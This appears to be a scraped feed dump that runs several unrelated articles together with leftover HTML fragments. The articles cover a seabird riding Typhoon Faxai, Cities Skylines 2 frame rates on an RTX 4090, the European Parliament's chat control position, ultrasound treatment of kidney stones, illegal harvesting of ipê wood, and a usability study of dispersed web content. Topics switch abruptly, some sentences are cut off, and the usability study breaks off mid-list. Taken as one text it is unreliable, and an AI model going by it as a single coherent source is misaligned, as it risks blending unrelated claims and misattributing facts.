<div id="readability-page-1" class="page"><div><p>In 2019, a bold male seabird threw caution to the wind, flying above Typhoon Faxai as the storm pummeled southeastern Japan. It was the start of an 11-hour, 1,146-km (712-mile) crazy journey, that took the bird 15,000 feet higher than normal, at three times its usual speed, on a ride that his species are quite good at avoiding. Happily, the bird survived and eventually returned to his feathered friends with quite the story to tell.</p><p>Thanks to GPS bio-loggers that had been attached to 14 adult streaked shearwater (<i>Calonectris leucomelas</i>) seabirds in August that year by Tohoku University biologist Kozue Shiomi to track nesting behaviors, scientists were lucky enough to have a record of this nuts nature-defying act, spotting a huge flight pattern anomaly that coincided with the storm.</p><p>While it didn’t affect the other birds, one male managed to get caught up in the atmospheric drama, though researchers can’t say if he had a daredevil streak or was just in the wrong place at the wrong time. But one thing is for certain: the 585-g (1.3-lb) bird didn't have much choice but to 'go with the flow.'</p><p>Throughout the 11-hour epic flight, the bird completed five full loops in circles ranging from 50-80 km (31-50 miles) in diameter, which tracked with the typhoon’s rotation and movement. While the shearwaters usually fly below 100 m (328 ft), this brazen bird found himself in entirely new territory, soaring at an altitude of 4,700 m (15,420 ft). For context, small aircraft fly between 600 and 3,000 m (2,000 and 10,000 feet).</p><p>All the while, the bird was zipping along at 90-170 km/h (56-106 mph). Given that these birds generally cruise at 10-60 km/h (6-37 mph), at his top speed, our aerial adventurer was probably flying on a wing and a prayer.</p><p>The bird took a less-than-scenic route over mainland Japan before being carried back out above the Pacific Ocean as the typhoon swung out to sea. At this point, with the storm’s power subsiding, the bird resumed normal transmission and no doubt had some explaining to do when he returned to his flock over the water near the nesting island.</p><div data-align-center="">

It also had a delayed departure time, which scientists note is unusual for the species.</p><p>“The early evening departure of the bird from the breeding area was also unusual for this species, which usually departs for foraging during several hours before sunrise,” the researchers noted. “This might indicate that the bird attempted to circumnavigate the harsh conditions in advance but failed.”</p><p>They note that it’s impossible to know how much of this journey was planned, but it's just as likely the bird could have opted out of the trip but chose to ‘ride’ the storm instead.</p><p>Regardless, looking at this wild ride highlights the increasing risks that seabird populations could face as climate change drives more extreme weather events.</p><div data-align-center="">

		<p>Paradox Interactive has released its latest city builder, Cities Skylines 2. Unfortunately, though, this is one of the worst-optimized PC games of 2023. Cities Skylines 2, even on a completely new/empty map, runs with 20fps on an NVIDIA GeForce RTX 4090 at 4K/High.<span id="more-175330"></span></p>
<p>I’m truly shocked by how bad this game runs. And if this city builder used Ray Tracing or Path Tracing, I wouldn’t be complaining. We know that Ray Tracing and Path Tracing are really demanding. But no, Cities Skylines 2 does not take advantage of them. And seriously, take a look at the screenshots and video. What on Earth is pushing the RTX 4090 so hard here?</p>

<p>Since I’m not really good at city builders, we’ll use an empty map for our upcoming PC Performance Analysis. In other words, we’ll be doing this game a favor. Because if it performs like that on an empty map, I can’t imagine how it will run with a mid/big city. We do know that a mid-sized city runs with <a href="https://www.dsogaming.com/pc-performance-analyses/cities-skylines-2-reportedly-runs-with-7-12fps-on-an-intel-core-i9-13900ks-with-amd-radeon-rx-7900xtx-at-4k-high-settings/" rel="bookmark">7-12fps on an AMD Radeon RX 7900XTX</a>. And if the main menu is anything to go by, then we might have an idea of the performance of a big city on an RTX4090. And look and behold. 10fps. 10fps on an NVIDIA GeForce RTX4090. That’s more demanding than Cyberpunk 2077 in 4K with Path Tracing. Man, what a mess.</p>

<p>Colossal Order is currently <a href="https://store.steampowered.com/news/app/949230/view/3744239011016556921" target="_blank" rel="noopener">working on making the game run better</a>. The team is optimizing/balancing the effects that affect fillrate. Thus, they’re making changes to things like Depth of Field, Global Illumination, and Volumetrics to make them work better and not slow down your game.</p>
<p>After further experimentation, we figured out the one setting that can cripple performance. That’s the Depth of Field Quality. By lowering it to Low, we were able to improve performance in the main menu. However, in our empty map, we could not come close to a 60fps experience. Instead, the game was running with 40fps. 40fps with this kind of visuals on an NVIDIA RTX 4090. Enough said.</p>

<p>As I mentioned before, we’re going to use an empty map to test how well the game runs on different computers. It wanted to test it with a medium-sized city, but the game doesn’t have a benchmark tool, and there are no pre-made cities to use. So, our benchmarks will showcase the best possible performance you can get in this city builder.</p>
<p>Stay tuned for more!</p>

<p>This week, the European Parliament’s negotiators reached a broad majority agreement on a common position concerning the controversial EU chat control bill. The Commission’s bill proposes bulk scanning and reporting of private messages for allegedly suspicious content by using error-prone algorithms, including „artificial intelligence“. But the European Parliament’s position removes indiscriminate chat control and allows only for a targeted surveillance of specific individuals and groups reasonably suspicious of being linked to child sexual abuse material, with a judicial warrant. End-to-end encrypted messengers are exempted. Instead, internet services will have to design their services more securely and thus effectively prevent the sexual exploitation of children.</p>



<p>EU lawmaker Patrick Breyer of the Pirate Party, a digital freedom fighter who negotiated the parliamentary position on behalf of his group Greens/EFA, explains:</p>



<p>“Under the impression of massive protests against the looming indiscriminate chat control mass scanning of private messages, we managed to win a broad majority for a different, new approach to protecting young people from abuse and exploitation online. As a pirate and digital freedom fighter, I am proud of this breakthrough. The winners of this agreement are on the one hand our children, who will be protected much more effectively and in a court-proof manner, and on the other hand all citizens, whose digital privacy of correspondence and communication security will be guaranteed.</p>



<p>Even if this compromise, which is supported from the progressive to the conservative camp, is not perfect on all points, it is a historic success that removing chat control and rescuing secure encryption is the common aim of the entire Parliament. We are doing the exact opposite of most EU governments who want to destroy digital privacy of correspondence and secure encryption. Governments must finally accept that this highly dangerous bill can only be fundamentally changed or not be passed at all. The fight against authoritarian chat control must be pursued with all determination!</p>



<p>In detail, our position will protect young people and victims of abuse much more effectively than the EU Commission’s extreme proposal:</p>



<ol>
<li>Security by design: In order to protect young people from grooming, internet services and apps shall be secure by design and default. It must be possible to block and report other users. Only at the request of the user should he or she be publicly addressable and see messages or pictures of other users. Users should be asked for confirmation before sending contact details or nude pictures. Potential perpetrators and victims should be warned where appropriate, for example if they try to search for abuse material using certain search words. Public chats at high risk of grooming are to be moderated.</li>



<li>In order to clean the net of child sexual abuse material, the new EU Child Protection Centre is to proactively search publicly accessible internet content automatically for known CSAM. This crawling can also be used in the darknet and is thus more effective than private surveillance measures by providers.</li>



<li>Providers who become aware of clearly illegal material will be obliged to remove it – unlike in the EU Commission’s proposal.</li>



<li>Law enforcement agencies who become aware of illegal material must report it to the provider for removal. This is our reaction to the case of the darknet platform Boystown, where the worst abuse material was further disseminated for months with the knowledge of Europol.</li>
</ol>



<p>At the same time, we are pulling the following poisonous teeth out of the EU Commission’s extreme bill:</p>



<ol>
<li>We safeguard the digital secrecy of correspondence and remove the plans for blanket chat control, which violate fundamental rights and stand no chance in court. The current voluntary chat control of private messages (not social networks) by US internet companies is being phased out. Targeted telecommunication surveillance and searches will only be permitted with a judicial warrant and only limited to persons or groups of persons suspected of being linked to child sexual abuse material.</li>



<li>We safeguard trust in secure end-to-end encryption. We clearly exclude so-called client-side scanning, i.e. the installation of surveillance functionalities and security vulnerabilities in our smartphones.</li>



<li>We guarantee the right to anonymous communication and remove mandatory age verification for users of communication services. Whistleblowers can thus continue to leak wrong-doings anonymously without having to show their identity card or face.</li>



<li>Removing instead of blocking: Internet access blocking will be optional. Under no circumstances must legal content be collaterally blocked.</li>



<li>We prevent the digital house arrest: We don’t oblige app stores to prevent young people under 16 from installing messenger apps, social networking and gaming apps ‘for their own protection’ as proposed. The General Data Protection Regulation is maintained.”</li>
</ol>



<p>The EU Parliament’s civil liberties committee is due to confirm the agreement on 13 November.</p>



<p><strong>20 November 2023:</strong> Announcement in plenary (likely no vote on substance) </p>



<p><strong><mark>4 December 2023: </mark></strong><a href="https://www.consilium.europa.eu/en/meetings/jha/2023/10/19-20/"><mark>Envisaged Adoption of Partial General Approach by EU Council</mark></a> (tbc) </p>

<div id="readability-page-1" class="page"><div id="js-Story-Content-0"><p><span>SEATTLE — </span>A groundbreaking medical procedure for those with kidney stones will soon be offered at the University of Washington after more than two decades of research. It will also give astronauts the go ahead they need from NASA to travel to Mars.</p><p>It's a groundbreaking procedure to get rid of painful stones while you're awake, no anesthesia needed.</p><p>"This has the potential to be game changing," said Dr. Kennedy Hall with UW Medicine.</p><p>Still being run through clinical trials at UW Medicine, the procedure called <a href="https://newsroom.uw.edu/news/ultrasound-promises-relief-those-kidney-stones" target="_blank" title="https://newsroom.uw.edu/news/ultrasound-promises-relief-those-kidney-stones">burst wave lithotripsy</a> uses an ultrasound wand and soundwaves to break apart the kidney stone.</p><p>Ultrasonic propulsion is then used to move the stone fragments out, potentially giving patients relief in 10 minutes or less.</p><p>"It would really kind of revolutionize the treatment of kidney stones in the sense that you could come to the clinic and have a stone treated before its a problem," said Dr. Jonathan Harper with UW Medicine.</p><p>Seattle resident Mark Mackenzie will tell you first hand, the treatment works. He got a chance to take part in the clinical trial just days before he was to be operated on.</p><p>"Nothing else in your life matters when you're experiencing kidney stone pain. I wrote an email to the folks that had done the treatment and just thanked them from the bottom of my heart for saving me from that ordeal," Mackenzie  said. "It's not a cure-all for everybody, but in some cases, as in mine, it can be, almost what amounts to a miracle cure."</p><p>Dr. Kennedy Hall, an emergency medicine doctor at Harborview Medical Center, said this will also change how future patients are treated in the emergency room, who show up, having no idea they have a kidney stone.</p><p>"There are a lot of patients with kidney stones, over a million visits a year to emergency departments," said Hall. "Many of them would have stones that we could intervene on at that point of care in the emergency department, so it's potentially groundbreaking."</p><p>This technology is also making it possible for astronauts to travel to Mars, since <a href="https://www1.grc.nasa.gov/space/human-research-program/computational-modeling/renal-stone-incidence-rate-quantification/" target="_blank" title="https://www1.grc.nasa.gov/space/human-research-program/computational-modeling/renal-stone-incidence-rate-quantification/">astronauts are at a greater risk for developing kidney stones</a> during space travel.</p><p>It's so important to NASA, the space agency has been funding the research for the last 10 years.</p><p>"They could potentially use this technology while there, to help break a stone or push it to where they could help stay on their mission and not have to come back to land," said Harper.</p><p>Right now this technology is only available through clinical trials, but according to UW Medicine, it may be available to be used on patients in a regular office setting within the next year or so.</p></div></div>]]></description>

            <description><![CDATA[<p>URL: <a href="https://www.chalmers.se/en/current/news/75-percent-of-exclusive-hardwood-may-be-illegally-harvested,c3863187/">https://www.chalmers.se/en/current/news/75-percent-of-exclusive-hardwood-may-be-illegally-harvested,c3863187/</a>, See on <a href="https://news.ycombinator.com/item?id=38025998">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><img alt="" src="https://mb.cision.com/Public/5569/3861158/880b567807b5dc02_800x800ar.jpg"></p>

<p><span><strong>The tropical wood type ipê is popular for building exclusive wooden decks, and in North America and Europe, the demand for the material has increased sharply. Now, a study from Chalmers University of Technology, Sweden, shows that more than three-quarters of all ipê from the top producing region in Brazil could have been harvested illegally. "The study reveals where in the chain the greatest risks lie. It can be a tool to counteract illegal logging," says Caroline S.S. Franca, PhD student at Chalmers.</strong></span></p>

<p><span>Ipê is one of the world's hardest woods. It is therefore particularly suitable for building balconies, conservatories, stairs or piers. Demand for the exclusive, tropical wood has increased steadily in recent years, especially on European, American and Canadian markets. In Brazil, the country of origin for 96 percent of all ipê on the market, exports have increased by over 76 percent in volume over the past decade.&nbsp;</span></p>

<p><span>This development means an increased risk of illegal logging of ipê, which in November 2022 was included on the <a href="https://cites.org/eng" target="_blank">Cites</a> list of species threatened by overexploitation due to its popularity and increasing demand through international trade.</span></p>

<p><span>"Some products from the rainforest are more valuable and therefore more vulnerable to illegal logging. Ipê is at the top of that list. At the same time, ipê trees grow slowly, which means that regrowth takes a long time. The risk of extinction is real, and today there are no reliable figures on the amount of remaining trees and the damage to existing stands that has already been done," says Caroline S.S. Franca, PhD student in Physical Resource Theory at Chalmers.</span></p>

<h2><span>Mapping where risks are greatest</span></h2>

<p><span>Caroline S.S. Franca is the lead author of a research study on the risks for illegal logging of ipê in Brazil, which was recently published in Nature Sustainability. In the study, the researchers analysed extensive amounts of data to identify where in the supply chains there are significant risks that logging has taken place illegally.</span></p>

<p><span>The conclusion is that more than three-quarters of all ipê from Pará—the top producing state of this wood in Brazil and a major source of exports—in the period 2009-2019 may have been illegally harvested.</span></p>

<p><span>"In the study, we see, for example, that 16 percent of the ipê that ends up on the market is harvested without proper permits, and that landowners claim that they have felled more ipê on their land than is likely to exist on the stated area. We also show that there is more wood in circulation than the official production figures indicate," she says.&nbsp;</span></p>

<h2><span>Paving the way for better enforcement and practices</span></h2>

<p><span>“We know that illegal logging is driving forest degradation, and is linked to organised crime, conflict and the destruction of forest-dependent local communities,” continues Caroline S.S. Franca, adding that “degradation of Amazon forests does not only affect the local environment and the ecological diversity of the rainforest, it is also as large of a contributor to climate change as outright deforestation.”</span></p>

<p><span>She hopes that her research results can contribute to an increased awareness of the extent of illegal logging among decision-makers and actors in the supply chain, as well as among consumers.</span></p>

<p><span>“The novel methods developed in the study, exploring existing patterns in the data for transactions and approvals of ipê exploration have an enormous potential both to improve forest control systems in Brazil, as well as to support supply-chain actors in their efforts to make timber sourcing more responsible and sustainable," says Marco Lentini, a co-author of the study with a long-standing experience working on sustainable forest management in the Brazilian Amazon.</span></p>

<h2><span>The information already exists, now there is political will to use it</span></h2>

<p><span>Recent numbers form Brazil’s forest monitoring system shows that deforestation in the Amazon have been almost halved in 2023, compared to last year. Brazilian President Luiz Inácio Lula da Silva also initiated the so-called Belém Declaration—an alliance among eight South American countries to combat the deforestation of the Amazon, adopted on August 8, 2023.</span></p>

<p><span>"This declaration is a welcome expression of renewed political will to reduce deforestation," comments Martin Persson, co-author of the ipê study and a Chalmers researcher with extensive experience of research on the devastation of the Amazon.&nbsp;</span></p>

<p><span>But he also emphasises that the danger is far from over, and that the declaration itself will not lead to change.</span></p>

<p><span>“Halting deforestation and forest degradation requires concrete policy measures. And what we point out in our study is that there is already data and information that can be used by authorities to get to those who harvest forests illegally," he says. &nbsp;</span></p>

<h2><span>Important for consumers to ask questions</span></h2>

<p><span>There is a certification for sustainably produced wood, FSC, which can serve as a guide for consumers who want to avoid buying non-sustainable or illegally harvested wood. But regardless of whether the wood has an FSC certification or not, Caroline S.S. Franca emphasises that it is always important to ask a few basic questions before buying.</span></p>

<p><span>"Where exactly does the wood come from? Is there documentation of the origin of the wood and its path through the production chain? As a consumer, you have a greater opportunity to make an informed decision if you get answers to those questions," she says.&nbsp;</span></p>

<h3><span>More about the scientific study</span></h3>

<p><span>The scientific article <a href="https://doi.org/10.1038/s41893-023-01189-3" target="_blank">Quantifying timber illegality risk in the Brazilian forest frontier</a> has been published in Nature Sustainability. It is written by Caroline S.S. Franca and Martin Persson at Chalmers University of Technology, Tomás Carvalho at the Stockholm Environment Institute (SEI) and Marco Lentini at the Instituto de Manejo e Certificação Florestal e Agrícola (IMAFLORA) in Brazil.&nbsp;</span></p>

<h3><span>More about the ipê market</span></h3>

<ul>
	<li><span>Brazil is the country of origin for 96 percent of all ipê on the market.</span></li>
	<li><span>Brazil's exports of ipê have increased by over 76 percent in volume between the period 2010 – 2021.&nbsp;</span></li>
	<li><span>85 percent of the demand for ipê comes from European, American and Canadian markets. 45% of exports go to Europe.&nbsp;</span></li>
	<li><span>Since 2017, at least 525,000 tonnes, or 470,000 cubic metres of ipê, have been exported from Brazil, Bolivia, Paraguay and Peru.</span></li>
	<li><span>At least two-thirds of the species exported as ipê from the Amazon region in 2017-2021 are on the <a href="https://www.iucnredlist.org/" target="_blank">IUCN</a> list of species threatened with extinction. Ipê is also on the list of species threatened by overexploitation due to international trade. &nbsp;</span></li>

<h3><span>More about deforestation and forest degradation</span></h3>

<ul>
	<li><span>Deforestation is the cutting down of forests to make way for other purposes. In the Amazon, deforestation is often driven by the conversion of rainforest to pasture or arable land.</span></li>
	<li><span>Forest degradation - steadily driven by timber production as well as other drivers - is a more gradual process in which unsustainable harvesting cause biodiversity to be lost and the forests' ability to produce timber and other benefits is reduced.&nbsp;</span></li>
</ul>

<h3><span>More about FSC certification of timber</span></h3>

<p><span>FSC, the <a href="https://fsc.org/en" target="_blank">Forest Stewardship Council</a>, works to ensure that the world's forests are managed more sustainably. With FSC-controlled wood, the risk of the wood coming from unacceptable sources, such as illegally harvested wood or wood from forests with endangered high conservation values, is limited.&nbsp;</span></p></div></div>]]></description>

<p>Definition<strong>:</strong>&nbsp;<strong>Content dispersion</strong>&nbsp;occurs when the content of a responsive webpage appears overly large and stretched out on large laptop or desktop screens.</p>
<p>Dispersed content may occur only on certain sections of a page. A single section of dispersed content may not cause significant usability issues. However, when most of the content on a page is overly dispersed, the cumulative impact on usability is largely negative.</p>
<p>This article reports the&nbsp;<a href="https://www.nngroup.com/articles/usability-101-introduction-to-usability/">usability issues</a>&nbsp;of mobile-first web design that result in overly dispersed content on desktops. It is based on a study involving 13&nbsp;<a href="https://www.nngroup.com/articles/usability-testing-101/">qualitative usability tests</a>&nbsp;that were combined with semi-structured&nbsp;<a href="https://www.nngroup.com/articles/user-interviews/">interviews</a>.</p>
<p>We found that content dispersion on large-screen devices&nbsp;<strong>causes an increase in&nbsp;</strong><a href="https://www.nngroup.com/videos/cognitive-load/"><strong>cognitive load</strong></a><strong>&nbsp;and&nbsp;</strong><a href="https://www.nngroup.com/articles/interaction-cost-definition/"><strong>interaction costs</strong></a><strong>, difficulty understanding content, and user frustration</strong>.</p>
<h2><a id="Design Approaches that Result in Content Dispersion" name="Design Approaches that Result in Content Dispersion"></a>Design Approaches that Result in Content Dispersion</h2>
<p>Content dispersion is the product of several design trends: mobile-first, minimalism, and large imagery. Often these trends are used in combination to produce pages with low information density.</p>
<h3>Mobile-First</h3>
<p>Over&nbsp;<a href="https://gs.statcounter.com/platform-market-share/desktop-mobile/worldwide#monthly-202102-202202">55% of worldwide web traffic comes from mobile devices</a>. As the use of mobile devices continues to grow, so does&nbsp;the importance of mobile designs. This is why the&nbsp;<a href="https://www.nngroup.com/articles/mobile-first-not-mobile-only/">mobile-first design approach</a>, where designers first design for mobile and then adjust the design for tablets and desktop, has become very popular.</p>
<h3>Minimalism</h3>
<p>A&nbsp;<a href="https://www.nngroup.com/articles/characteristics-minimalism/">minimalist</a>&nbsp;style eliminates any design elements that are not required for the core functionality or message of the website. To avoid a cluttered appearance and achieve a minimalist aesthetic, designers make heavy use of negative space and simplify the amount of content displayed in one screen viewport. The result is content dispersion: a long page with low information density.</p>
<h3>Large Images</h3>
<p>In the past, slow internet speeds limited the use of high-resolution imagery on websites. Today, however, improved bandwidth has eliminated this design constraint. Many modern web pages use large, high-resolution imagery. Image-focused designs are eye-catching, but they result in overly dispersed text content.&nbsp;</p>
<p>A few large images on a desktop page can work well. However, if the page has too many big images, the text-based content that is displayed inline or in between images becomes dispersed and fragmented across the page.</p>

<figcaption><em>Waze.com: The image took almost two-thirds of the viewport width without adding much value, the text was enlarged and bold, and the information density was low.</em></figcaption>
</figure>
<h2><a id="About the Study" name="About the Study"></a>About the Study</h2>
<p>We&nbsp;conducted 13&nbsp;qualitative usability tests. We looked at two types of layouts (condensed and dispersed) on two different types of web pages (homepage and product page), for a total&nbsp;<strong>of four different prototypes</strong>&nbsp;corresponding to all combinations of these variables.</p>
<p>To create these prototypes, we searched the web to find real desktop web pages with low content density, expansive negative space, and enlarged text across most parts of the page. We recreated these web pages as dispersed prototypes. For each, we also produced a condensed version using the same content from the original page.&nbsp;</p>
<figure><img alt="" height="7175" loading="lazy" src="https://media.nngroup.com/media/editor/2023/10/09/frame-28.png" width="3274">
<figcaption><em>The dispersed homepage prototype (left) was developed by recreating Robinhood.com’s homepage. The Robinhood brand was removed, and the page was represented as a fictitious brand. The condensed homepage prototype (right) used the same text-based content as the original dispersed page, displayed in a layout with higher content density. This page was given a different fictitious brand, and the branded imagery was swapped out to make the page appear unique.&nbsp;</em></figcaption>
</figure>
<p>We had users perform open-ended activities on all 4 prototypes and facilitated a follow-up discussion comparing the two versions of each page type.</p>
<p>The full study methodology&nbsp;is available in the <a href="https://www.nngroup.com/articles/content-dispersion-methodology/">sidebar of this article</a><em>.</em></p>
<h2><a id="Negative Effects of Dispersed Content" name="Negative Effects of Dispersed Content"></a>Negative Effects of Dispersed Content</h2>
<p>When content dispersion exists across large portions of the page, it can severely impact the user experience overall.&nbsp;</p>
<p><strong>Usability issues of dispersed content include:</strong></p>
<ul>
<li>Increased page length and&nbsp;<a href="https://www.nngroup.com/articles/interaction-cost-definition/">interaction cost</a></li>
<li>Increased&nbsp;<a href="https://www.nngroup.com/articles/minimize-cognitive-load/">cognitive load</a></li>
<li>Difficulty building a&nbsp;<a href="https://www.nngroup.com/articles/mental-models/">conceptual model</a>&nbsp;for the page</li>
<li>Increased frustration&nbsp;</li>
<li>Lower trustworthiness</li>
</ul>
<h3>Content Dispersion Increases Interaction Cost</h3>
<p>There are two ways through which content dispersion raises interaction costs and makes information hard to find:&nbsp;</p>
<ul>
<li>Long pages that require more scrolling</li>
<li>The use of mobile-specific design elements like accordions that require more clicks to access content</li>
</ul>
<h4>Long Pages</h4>
<p>Large-screen rendering of mobile-first websites causes content to become dispersed, resulting in long pages. This effect is amplified when these sites employ minimalist and image-focused design approaches. Long pages require users to scroll more and thus increase the interaction cost.</p>
<p>Long pages also make it&nbsp;<strong>harder for users to find specific information</strong>&nbsp;on the page because the content is spread out over many viewports. Indeed, our study participants had more difficulty finding information on the dispersed product page than on its condensed version.&nbsp;</p>
<p>When asked if she found all the information that she was looking for, one participant responded: “Not really. I still don’t know what’s on the other side of the speaker. How is it hooked onto the bike or the chair?” In her effort to find this information, she scrolled through the dispersed page multiple times before she eventually discovered it.&nbsp;</p>
<figure><img alt="" height="3401" loading="lazy" src="https://media.nngroup.com/media/editor/2023/10/09/specific-information-hard-to-find.png" width="2394">
<figcaption><em>One participant struggled to find information about how the speaker could be strapped to a bike. It required much scrolling to find the section with product specifications and information about the material, which included the answer that the participant was seeking. This example shows how difficult it can be to find specific information when the content is highly dispersed.</em></figcaption>
</figure>
<h4>Mobile-Specific Design Patterns</h4>
<p>Because many websites with dispersed content are the result of a mobile-first design approach, they often use mobile design patterns that frustrate desktop users. For example,&nbsp;<a href="https://www.nngroup.com/articles/mobile-accordions/">accordions work very well on mobile devices</a>&nbsp;because they collapse a large amount of information into a smaller space, shortening the mobile page and making the information more accessible. They also provide a high-level overview of the content available, allowing users to access the area they are interested in directly. However, on large screens, long pages are less of a problem.&nbsp;<a href="https://www.nngroup.com/articles/accordions-on-desktop/">Accordions can contribute to content fragmentation</a>&nbsp;and significantly increase the interaction cost of finding crucial information, without the benefit they bring on mobile.</p>
<p>When viewing the accordion menu of product information on the dispersed prototype, one participant stated: “Like for this part here with the details: I had to click on here if I wanted to read the information. And then I had to close it because I didn't want to keep it all open. So, I would've had to click all of them to read them, instead of me scrolling and trying to see what is important. On other pages, I'm able to click the specs, and boom, it's right here.”</p>
<figure><img alt="" height="1369" loading="lazy" src="https://media.nngroup.com/media/editor/2023/10/06/speaker-specs-dispersed.jpg" width="1440">
<figcaption><em>The dispersed prototype required participants to interact with every single accordion item to consume all the product information. The design caused frustration and impeded the participants' ability to remember the product specifications easily.</em></figcaption>
</figure>
<p>One user said, “I prefer this page (the condensed version). It’s less number of clicks. All the information is right there. Everything is right in front of you.”</p>
<figure><img alt="" height="763" loading="lazy" src="https://media.nngroup.com/media/editor/2023/10/06/speaker-specs-condensed.jpg" width="1440">
<figcaption><em>The condensed product specification allowed participants to scan and consume all relevant information easily.</em></figcaption>
</figure>
<h4>Increased Cognitive Load&nbsp;</h4>
<p>As images get larger and negative space expands, the text-based content gets fragmented across viewports. When related content is chopped up and separated across viewports, it can’t be viewed as a unit.</p>
<p>Users must&nbsp;<a href="https://www.nngroup.com/articles/recognition-and-recall/">remember</a>&nbsp;information from different viewports (and scroll back and forth between them) in order to reach a conclusion or make a decision. The capacity of their short-term memory can be easily overwhelmed.&nbsp;&nbsp;</p>
<p>While viewing the dispersed homepage prototype, one participant described his struggle: “I have to see the offers to talk about them, and it takes a long time […]. It takes me five seconds to scroll, to look at them all, and then get a sense of understanding, and it takes me five seconds to scroll back to see them all.”</p>
<figure><img alt="" height="2321" loading="lazy" src="https://media.nngroup.com/media/editor/2023/10/09/frame-3.jpg" width="1080">
<figcaption><em>The dispersed page presented one service per viewport. This layout forced users to remember the details of each service and scroll up and down to compare them.</em></figcaption>
</figure>
<figure><img alt="" height="1105" loading="lazy" src="https://media.nngroup.com/media/editor/2023/10/06/offerings-condensed.jpg" width="1440">
<figcaption><em>Our condensed product page prototype took the same information from the original dispersed page and arranged it in a 2x2 grid that allowed users to compare multiple services simultaneously, without having to remember the details of each service.</em></figcaption>
</figure>
<p>The condensed layout displayed more information in the same viewport and alleviated the cognitive burden on users, enabling a more effortless and gratifying browsing experience.</p>
<p>The style of imagery used on the webpage also impacts how fragmented the content feels. When the images are informational, people will spend time viewing them to extract useful information. Thus, an informational image stretched out on a large screen is as good as text and is unlikely to cause extra work. However, when&nbsp;<a href="https://www.nngroup.com/articles/zigzag-page-layout/">images are decorative</a>, people won’t spend time looking at them because they hold no informational value. In these cases, the fragmentation of useful content feels even worse, as users will need to scroll past the bloated illustrations to get small pieces of useful content.&nbsp;</p>
<p>When exploring our prototyped homepage, one participant described his frustration:&nbsp;“It's just too much. The image takes up half the block here, but I think that you could put more emphasis on, you know, a small picture and then, I guess, increase the font for the actual description of the product.”</p>

<h3>Difficulty Building a Conceptual Model</h3>
<p>With an increased page length due to dispersed content and an increased demand on working memory, dispersed pages made it more difficult for users to assess information and build a&nbsp;<a href="https://www.nngroup.com/articles/mental-models/">mental model</a>&nbsp;of the concepts communicated on the website compared to our condensed prototype.</p>
<p>One participant struggled to build a mental model of the concepts described on the dispersed homepage prototype, saying, “Having to try to retain the four or five offers to understand the scope, rather than seeing the four or five offers all together to understand the scope is more difficult for me.”</p>
<p>In another instance, we saw this same difficulty in building a conceptual understanding of a wireless speaker on our dispersed product page prototype. When making a purchasing decision, users tend to consider multiple factors, such as the price, product details, reviews, and more. When these key pieces of information were spread over many viewports, they were forced to consume it separately and remember it. This negatively impacted users’ ability to gain an understanding of the product, which allows them to make a confident purchasing decision. When important information is delivered together or across fewer viewports, it’s easier to build a conceptual understanding.</p>
<p>When talking about the differences between the dispersed and condensed product pages, one participant explained: “I tend to forget a lot of things. So, on this page (the dispersed page), I have to constantly scroll to revisit the information to remember it, whereas on this page (the condensed page), I have all the information together on the screen.”</p>
<p>Difficulty building a conceptual model is amplified when users encounter the&nbsp;<a href="https://www.nngroup.com/articles/illusion-of-completeness/">illusion of completeness</a>, an issue more prevalent on dispersed websites, as they often use color blocks that create strong horizontal lines across the viewport or expansive negative space that can falsely signal that the content on the page is complete. If no scrolling cues exist to indicate that there is more content to discover, users are likely to miss this content.</p>
<p>One participant who encountered the illusion of completeness at the top of the dispersed prototype gave the site a 5 out of 7 for ease of use. When asked why he gave this rating, he explained how the illusion had originally stumped him, saying,&nbsp;“Well, just because I was doing it on the laptop screen […] I didn't have a sense that there was information below the headline there and so I only saw half the page on my laptop. […] It just so happens, it's framed just right on my laptop that it looks like a full page […] There are just no cues, I'm not at the bottom. […] I just don't naturally go into a place and scroll and say, where's the bottom?”</p>
<figure><img alt="" height="1618" loading="lazy" src="https://media.nngroup.com/media/editor/2023/10/06/robinhood-illusion-of-completeness.png" width="2880">
<figcaption><em>When interacting with our dispersed prototype, one participant encountered the illusion of completeness. Because there was nothing at the bottom of the screen indicating more content existed, he assumed he was at the bottom of the page when he was only viewing the top portion.</em></figcaption>
</figure>
<h3>Trustworthiness Decreases</h3>
<p>Due to the usability issues described above, dispersed websites appear to provide less, yet harder-to-access content. Some users feel that the company is hiding information and may lose trust in it.</p>
<p>One participant said that “transparency is a big part” and that it’s important that “information is easy to see and it’s not like the website is hiding anything.” When this was the case, “it created a sense of security, comfort, and transparency that people like and need.”</p>
<p>For these reasons, users showed a clear preference for a condensed layout, especially when their goal was to explore the website and build an overall understanding of its offerings.</p>
<h2><a id="Positive Effects of Dispersed Content" name="Positive Effects of Dispersed Content"></a>Positive Effects of Dispersed Content</h2>
<p>When an entire page becomes dispersed, the cumulative impact on usability is largely negative. However, there were some instances where content dispersion had a positive effect on the experience.&nbsp;</p>
<p>Because dispersion decreased the amount of content displayed within the viewport, it allowed users to focus on one piece of highlighted content at once and limited the perception of information overload.</p>
<p>Highlighting information by reducing the content density within a viewport can benefit the experience when:</p>
<ul>
<li><strong>Content is complex</strong>, allowing users to focus on understanding one piece at a time.</li>
<li><strong>Users need to familiarize themselves with the displayed content</strong>&nbsp;and, thereby, could be overwhelmed by too much information.</li>
<li><strong>High-value imagery is displayed.</strong>&nbsp;Large product pictures can add value by making it easy for users to examine the image to observe the fine details of a product.</li>
</ul>
<p>When viewing the dispersed product page with large product images, one participant stated: “What made the (dispersed) page a lot easier is that all the features were separated. It was more focused on presenting it visually and individually vs. having everything grouped together. This made it a lot easier to read and understand.”</p>
<figure><img alt="" height="1254" loading="lazy" src="https://media.nngroup.com/media/editor/2023/10/06/product-page-highlighted-content.png" width="2218">
<figcaption><em>A participant remarked positively about the ability to see the product's details with large pictures and corresponding explainer text.</em></figcaption>
</figure>
<p>When the images used are of high informational value, the resulting dispersion may be justified. However, as discussed, images used as filler or strictly for visual interest cause dispersion without added benefits. That is likely why the positive effects of content dispersion were less likely to be observed on the homepage prototype, where images are less valuable.&nbsp;</p>
<h2><a id="Design Recommendations" name="Design Recommendations"></a>Design Recommendations</h2>
<p>As more and more web traffic comes from mobile devices, the mobile-first approach will likely increase in popularity. Minimalist and image-focused design aesthetics are also here to stay. Given the usability implications of these design approaches on desktop experiences, designers should follow these design recommendations to avoid the biggest pitfalls:</p>
<ul>
<li><strong>Evaluate how designs render on desktop.</strong>&nbsp;If desktop rendering makes a large portion of the page excessively stretched out, reevaluate whether important content should be redesigned to allow for scannability on desktop.</li>
<li><strong>Evaluate the value added by images.</strong>&nbsp;Prioritize large images that add contextual understanding of the product or service offered. Ask yourself if the value of the large images is worth the dispersion they cause on desktop.</li>
